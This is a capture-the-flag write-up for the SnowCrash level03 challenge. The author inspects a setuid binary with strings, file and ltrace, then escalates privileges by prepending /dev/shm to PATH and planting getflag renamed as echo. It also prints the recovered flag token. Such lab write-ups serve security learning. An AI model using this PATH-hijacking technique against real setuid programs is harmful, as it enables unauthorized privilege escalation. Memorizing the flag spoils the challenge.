## level03
I went in and got greeted by an executable

![](https://hackmd.io/_uploads/S1yfVZNZp.png)

The strings output are shown as below

```
level03@SnowCrash:~$ strings ./level03
/lib/ld-linux.so.2
KT{K
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
/usr/bin/env echo Exploit me
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/home/user/level03
/usr/include/i386-linux-gnu/bits
/usr/include/i386-linux-gnu/sys
level03.c
types.h
types.h
long long int
__uid_t
envp
/home/user/level03/level03.c
long long unsigned int
setresuid
setresgid
unsigned char
GNU C 4.6.3
argc
__gid_t
short unsigned int
main
short int
argv
...
```

Here is the file type 

```
level03@SnowCrash:~$ file ./level03
./level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

Could `/home/user/level03/level03.c` be a source code indicator?

Looks like the setuid and setgid bit is set, which means that we can execute this program as the user who created it, which is our flag03 user.

The possible way forward now is to make this program execute `getflag`, so it can return us the flag as said user

To find a way to execute programs inside the executable, i used `ltrace` to identify any system calls made by the program.

```
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                 = 2003
geteuid()                                                                 = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                       = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                       = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
level03@SnowCrash:~$
```

Looks like it calls [system](https://man7.org/linux/man-pages/man3/system.3.html) to execute shell command `/usr/bin/env echo Exploit me`. Its quite weird that it calls to `env` first then `echo`

So it sets the current environment variables before calling echo. If I change the PATH variable to look for my own directory first, then whatever program that has the name `echo` will get executed. So thats what I did here.

```
export PATH=/dev/shm:$PATH
cp /bin/getflag /dev/shm
mv /dev/shm/getflag /dev/shm/echo

```

and once this is done, I re-executed level03 and got the flag `qi0maab88jeaj46qoumi7maus`

```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$
```